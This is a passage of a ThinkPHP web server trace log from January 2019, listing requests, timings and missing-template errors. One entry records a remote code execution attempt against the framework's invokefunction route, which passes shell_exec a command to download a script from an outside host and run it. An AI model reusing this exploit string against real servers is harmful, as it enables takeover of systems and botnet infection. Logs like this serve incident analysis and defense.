INFO: [ template_filter ] --END-- [ RunTime:0.000106s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011055s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011106s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000125s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000313s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000486s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000381s ]
INFO: [ app_end ] --END-- [ RunTime:0.000411s ]

[ 2019-01-30T15:30:15+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000048s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000308s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000347s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000711s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000751s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000789s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T16:00:56+08:00 ] 123.233.143.29 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]

[ 2019-01-30T16:25:14+08:00 ] 200.153.238.155 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000354s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000318s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000733s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000901s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000944s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000067s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000120s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009930s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010003s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000130s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000293s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000538s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000327s ]
INFO: [ app_end ] --END-- [ RunTime:0.000357s ]

[ 2019-01-30T17:13:15+08:00 ] 37.9.113.114 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000048s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000378s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000346s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000787s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000869s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000920s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T17:13:18+08:00 ] 37.9.113.114 /Home_Index_document.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000803s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000637s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001551s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001516s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001596s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000101s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000183s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.031328s ]
INFO: [ view_parse ] --END-- [ RunTime:0.031419s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000248s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000783s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001134s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000826s ]
INFO: [ app_end ] --END-- [ RunTime:0.000919s ]

[ 2019-01-30T18:15:50+08:00 ] 168.197.152.2 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000329s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000310s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000703s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001067s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001124s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000058s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000114s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010688s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010758s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000200s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000692s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000955s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000370s ]
INFO: [ app_end ] --END-- [ RunTime:0.000405s ]

[ 2019-01-30T20:01:49+08:00 ] 106.75.64.59 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000047s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000394s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000341s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000802s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000902s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000942s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000052s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000100s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010756s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010812s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000128s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000294s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000470s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000352s ]
INFO: [ app_end ] --END-- [ RunTime:0.000382s ]

[ 2019-01-30T21:40:29+08:00 ] 45.225.172.66 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000356s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000361s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000803s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000964s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001021s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000074s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000132s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010909s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010969s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000129s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000371s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000553s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000362s ]
INFO: [ app_end ] --END-- [ RunTime:0.000392s ]

[ 2019-01-30T21:56:19+08:00 ] 141.105.99.97 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000343s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000320s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000723s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001131s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001211s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000064s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000122s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011087s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011173s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000168s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000451s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000687s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000605s ]
INFO: [ app_end ] --END-- [ RunTime:0.000654s ]

[ 2019-01-30T22:09:11+08:00 ] 31.13.23.180 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000444s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000436s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000954s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001013s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001066s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000066s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000125s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.012170s ]
INFO: [ view_parse ] --END-- [ RunTime:0.012221s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000164s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000378s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000600s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000434s ]
INFO: [ app_end ] --END-- [ RunTime:0.000474s ]

[ 2019-01-30T23:46:25+08:00 ] 37.9.113.114 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000425s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000472s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000967s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001572s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001650s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T23:46:29+08:00 ] 37.9.113.114 /Home_Index_sdk.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000453s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000413s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000942s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001059s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001153s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000046s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000109s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011165s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011232s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000171s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000338s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000559s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000424s ]
INFO: [ app_end ] --END-- [ RunTime:0.000471s ]

